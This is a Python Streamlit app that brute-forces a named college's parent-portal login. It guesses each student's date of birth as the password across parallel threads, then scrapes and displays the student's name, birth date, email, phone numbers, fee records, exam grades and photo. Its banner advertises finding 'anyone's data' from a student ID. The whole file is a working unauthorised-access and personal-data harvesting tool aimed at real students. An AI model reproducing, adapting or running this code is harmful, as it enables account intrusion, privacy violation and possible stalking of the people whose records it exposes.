import pickle
import time
from datetime import date
from typing import Union
from threading import Thread
from urllib.parse import urlparse

import streamlit as st

from scraper import Scraper, cached, gen_usn


def get_cache():
    try:
        with open('cache1er2344.bin', 'rb') as file:
            return pickle.load(file)
    except FileNotFoundError:
        return {}


def gen_payload() -> dict[str, str]:
    return {
        "username": "",
        "dd": "",
        "mm": "",
        "yyyy": "",
        "passwd": "",
        "remember": "",
        "option": "com_user",
        "task": "login",
        "return": "",
        "ea07d18ec2752bcca07e20a852d96337": "1"
    }


class SisScraper(Scraper):
    def save_cache(self):
        with open('cache1er2344.bin', 'wb') as file:
            pickle.dump(self.get_dob.cache, file)

    def __init__(self, URL="https://parents.msrit.edu/"):
        self.URL = URL + ("/" if URL[-1] != "/" else "")
        super(SisScraper, self).__init__()

    def get_post_body(self, payload):
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        if body.find(id="username") is None: return body

    def get_stats(self, payload) -> dict[str, str]:
        body = self.get_post_body(payload)
        if body is None: return {}
        td = body.find_all("td")
        trs = body.find_all("tbody")[1].find_all("tr")
        return {
            "name": td[0].text.split(":")[1].strip(),
            "usn": payload["username"],
            "dob": payload["passwd"],
            "email": td[1].text.split(":")[1].strip(),
            "sem": td[2].text.split(":")[1].strip(),
            "quota": td[3].text.split(":")[1].strip(),
            "mobile": td[4].text.split(":")[1].strip(),
            "phone": td[5].text.split(":")[1].strip(),
            "course": td[6].text.split(":")[1].strip(),
            "category": td[8].text.split(":")[1].strip(),
            "class": body.find_all("p")[6].text.strip(),
            "batch": td[9].text.split(":")[1].strip(),
            "paid": [tr.find_all("td")[3].text.strip() for tr in trs]
        }

    def get_dept(self, head: str, year: str, dept: str, tolerate: int = 5):
        payload = gen_payload()
        tol = tolerate
        if tol <= 0: return
        payload["username"] = gen_usn(year, dept, roll, head)
        payload["passwd"] = self.get_dob(payload["username"])
        stats = self.get_stats(payload)
        if not stats:
            tol -= 1
        yield stats

    @cached(get_cache())
    @st.cache
    def get_dob(self, usn) -> Union[str, None]:
        join_year = int("20" + usn[3:5])
        for year in [y := join_year - 18, y - 1, y + 1, y - 2]:
            if dob := self.brute_year(usn, year): return dob

    @cached(get_cache())
    @st.cache
    def brute_year(self, usn: str, year: int) -> Union[str, None]:
        workers = []
        dob = [None]
        for month in range(1, 13):
            worker = Thread(target=self.brute_month, args=(usn, year, month, dob))
            workers.append(worker)
            worker.start()
        for worker in workers:
            worker.join()
        return dob.pop()

    def brute_month(self, usn: str, year: int, month: int, dob_thread: list = None) -> Union[str, None]:
        payload = gen_payload()
        assert (dob_list := isinstance(dob_thread, list)) or dob_thread is None, \
            "dob_thread must be a list, used for threading"
        if dob_list:
            assert len(dob_thread) == 1, \
                "dob_thread must have a single element, used for default value"
        for day in range(1, 32):
            if dob_list and len(dob_thread) > 1: return
            payload['username'] = usn.lower()
            payload['passwd'] = f"{year}-{month:02}-{day:02}"
            if self.get_post_body(payload):
                if dob_list: dob_thread.append(payload['passwd'])
                return payload['passwd']

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.save_cache()
        super(SisScraper, self).__exit__(exc_type, exc_val, exc_tb)


def macro(head: str, year: str, dept: str, file=None, dry: bool = False):
    with SisScraper() as SIS:
        write = \
            f"{'usn':{len(head + year + dept) + 3 + 5}}," \
            f"{'name':64}," \
            f"{'dob':10}," \
            f""
        print(f"[Log] {'Time':10} :", write)
        t = time.time()
        for stat in SIS.get_dept(head, year, dept):
            write = \
                f"{stat['usn']:{len(head + year + dept) + 3 + 5}}," \
                f"{stat['name']:64}," \
                f"{stat['dob']:10}," \
                f""
            dob = date.fromisoformat(stat['dob'])
            formated_dob = dob.strftime("%d %B %Y")

            disp = \
                f"Time taken: {time.time() - t:10.2f}sec"
            disp1 = f"Name: {stat['name']}"
            print(f"[Log] {time.time() - t:07.3f}sec :", write)
            st.write(disp)
            st.subheader(disp1)
            st.write(f"Date of Birth is:")
            st.subheader(f" {formated_dob}")
            more = st.button("More Details")
            if more:
                st.write(f"USN: {stat['usn']}")
                st.write(f"Email: {stat['email']}")
                st.write(f"Semester: {stat['sem']}")
                st.write(f"Quota: {stat['mobile']}")
                st.write(f"Phone: {stat['phone']}")
                st.write(f"Course: {stat['course']}")
                st.write(f"Category: {stat['category']}")
                st.write(f"Class: {stat['class']}")
                st.write(f"Batch: {stat['batch']}")
                st.write(f"Paid: {stat['paid']}")
            t = time.time()
            SIS.save_cache()


class ExamScraper(Scraper):
    def __init__(self, url="https://exam.msrit.edu/"):
        self.URL = url + ("/" if url[-1] != "/" else "")
        super(ExamScraper, self).__init__()

    def get_post_body(self, payload):
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        try:
            _ = body.find_all("h3")[0].text
            return body
        except IndexError:
            return

    def get_stats(self, payload) -> dict[str, str]:
        body = self.get_post_body(payload)
        if body is None: return {}
        url = urlparse(self.URL)
        return {
            "usn": payload["usn"],
            "name": body.find_all("h3")[0].text,
            "sgpa": body.find_all("p")[3].text,
            "photo": f"{url[0]}://{url[1]}" + body.find_all("img")[1]['src'],
        }

    def get_dept(self, head: str, year: str, dept: str, tolerate: int = 5):
        payload = gen_payload1()
        tol = tolerate
        if tol <= 0: return
        payload["usn"] = gen_usn(year, dept, roll, head)
        stats = self.get_stats(payload)
        if not stats:
            tol -= 1
        yield stats


def gen_payload1() -> dict[str, str]:
    return {
        "usn": "",
        "osolCatchaTxt": "",
        "osolCatchaTxtInst": "0",
        "option": "com_examresult",
        "task": "getResult"
    }


def micro(head: str, year: str, dept: str, rollnum):
    with ExamScraper("https://exam.msrit.edu/eresultseven/") as EXAM:
        for stat in EXAM.get_dept(head, year, dept, rollnum):
            write = \
                f"{stat['usn']:{len(head + year + dept) + 3 + 5}}," \
                f"{stat['name']:64}," \
                f"{stat['sgpa']:5}," \
                f"{stat['photo']}," \
                f""
            print(write)
            result1 = stat['sgpa']
            result = float(result1)
            if result >= 10.0:
                emoji = "🎉 Damn! You are a genius"
            elif result >= 9.0:
                emoji = "🎉"
            elif result >= 8.0:
                emoji = "😀"
            elif result >= 7.0:
                emoji = "🙂"
            elif result >= 6.0:
                emoji = "😐"
            elif result >= 5.0:
                emoji = "🙁"
            elif result >= 4.0:
                emoji = "😭"
            else:
                emoji = "😢"

            profile_image = f"{stat['photo']}"
            st.image(profile_image, caption=stat['name'], use_column_width=True)
            st.write(f"CGPA of Even sem:")
            st.subheader(f'{result}     {emoji}')


if __name__ == '__main__':
    def check_password():
        """Returns `True` if the user had the correct password."""

        def password_entered():
            """Checks whether a password entered by the user is correct."""
            if st.session_state["password"] == st.secrets["password"]:
                st.session_state["password_correct"] = True
                # del st.session_state["password"]
            else:
                st.session_state["password_correct"] = False

        if "password_correct" not in st.session_state:
            st.text_input(
                "Enter the Password to access 🫣", type="password", on_change=password_entered, key="password"
            )
            return False
        elif not st.session_state["password_correct"]:
            st.text_input(
                "Password", type="password", on_change=password_entered, key="password"
            )
            st.error("😕 Password incorrect")
            return False
        else:
            # Password correct.
            return True


    if check_password():
        HEAD = "1MS"
        st.header("Find Anyone's Data just using USN")
        usn = st.text_input("Enter your USN")
        check = False
        if len(usn) == 10:
            check = True
        btn = st.button("Find DOB")
        cgpa = False
        if usn:
            if check is False:
                st.error("Invalid USN")
        if check or btn:
            roll = int(usn[7:10])
            DEPT = usn[5:7].upper()
            YEAR = usn[3:5]
            macro(HEAD, YEAR, DEPT, dry=False)
            cgpa = st.button("Find CGPA")
        if cgpa:
            roll = int(usn[7:10])
            DEPT = usn[5:7].upper()
            YEAR = usn[3:5]
            micro(HEAD, YEAR, DEPT, roll)

hide_streamlit_style = """
                <style>
                # MainMenu {visibility: hidden;}
                footer {visibility: hidden;}
                footer:after {
                content:'Made with ❤️ by Amith and Shravan'; 
                visibility: visible;
	            display: block;
	            position: relative;
	            # background-color: red;
	            padding: 15px;
	            top: 2px;
	            }
                </style>
                """
st.markdown(hide_streamlit_style, unsafe_allow_html=True)
